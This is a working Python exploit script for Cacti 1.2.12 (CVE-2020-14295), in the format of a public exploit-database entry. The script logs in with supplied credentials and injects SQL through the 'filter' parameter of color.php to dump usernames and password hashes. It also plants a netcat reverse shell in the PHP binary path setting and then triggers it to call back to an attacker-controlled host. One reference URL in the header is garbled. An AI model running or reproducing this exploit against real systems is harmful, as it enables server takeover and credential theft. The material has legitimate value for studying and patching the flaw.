# Exploit Title: Cacti 1.2.12 - 'filter' SQL Injection / Remote Code Execution
# Date: 04/28/2021
# Exploit Author: Leonardo Paiva
# Vendor Homepage: https://www.cacti.net/
# Software Link: https://www.cacti.net/downloads/cacti-1.2.12.tar.gz
# Version: 1.2.12
# Tested on: Ubuntu 20.04
# CVE : CVE-2020-14295
# Credits: @M4yFly (https://twitter.com/M4yFly)
# References:
# https://github.commandcom/Cacti/cacti/issues/3622
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14295

#!/usr/bin/python3

import argparse
import requests
import sys
import urllib.parse
from bs4 import BeautifulSoup

# proxies = {'http': 'http://127.0.0.1:8080'}


def login(url, username, password, session):
    print("[+] Connecting to the server...")
    get_token_request = session.get(url + "/cacti/index.php", timeout=5) #, proxies=proxies)

    print("[+] Retrieving CSRF token...")
    html_content = get_token_request.text
    soup = BeautifulSoup(html_content, 'html.parser')

    csrf_token = soup.find_all('input')[0].get('value').split(';')[0]

    if csrf_token:
        print(f"[+] Got CSRF token: {csrf_token}")
        print("[+] Trying to log in...")

        data = {
            '__csrf_magic': csrf_token,
            'action': 'login',
            'login_username': username,
            'login_password': password
        }

        login_request = session.post(url + "/cacti/index.php", data=data) #, proxies=proxies)
        if "Invalid User Name/Password Please Retype" in login_request.text:
            print("[-] Unable to log in. Check your credentials")
            sys.exit()
        else:
            print("[+] Successfully logged in!")
    else:
        print("[-] Unable to retrieve CSRF token!")
        sys.exit()


def exploit(lhost, lport, session):
    rshell = urllib.parse.quote(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f")
    payload = f"')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='{rshell};'+where+name='path_php_binary';--+-"

    exploit_request = session.get(url + f"/cacti/color.php?action=export&header=false&filter=1{payload}") #, proxies=proxies)

    print("\n[+] SQL Injection:")
    print(exploit_request.text)

    try:
        session.get(url + "/cacti/host.php?action=reindex", timeout=1) #, proxies=proxies)
    except Exception:
        pass

    print("[+] Check your nc listener!")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='[*] Cacti 1.2.12 - SQL Injection / Remote Code Execution')

    parser.add_argument('-t', metavar='<target/host URL>', help='target/host URL, example: http://192.168.15.58', required=True)
    parser.add_argument('-u', metavar='<user>', help='user to log in', required=True)
    parser.add_argument('-p', metavar='<password>', help="user's password", required=True)
    parser.add_argument('--lhost', metavar='<lhost>', help='your IP address', required=True)
    parser.add_argument('--lport', metavar='<lport>', help='your listening port', required=True)
    args = parser.parse_args()

    url = args.t
    username = args.u
    password = args.p
    lhost = args.lhost
    lport = args.lport

    session = requests.Session()

    login(url, username, password, session)
    exploit(lhost, lport, session)